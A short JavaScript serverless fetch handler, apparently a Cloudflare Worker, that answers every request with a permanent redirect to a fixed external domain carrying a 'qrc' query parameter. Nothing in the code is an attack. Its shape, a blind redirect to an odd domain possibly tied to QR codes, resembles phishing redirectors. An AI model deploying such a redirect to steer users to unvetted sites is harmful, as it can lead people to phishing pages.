export default {
  async fetch(request, env, ctx) {
    const redirectUrl = "https://innovationaldocentrybase.org/?qrc=";
    return Response.redirect(redirectUrl, 301);
  }
};
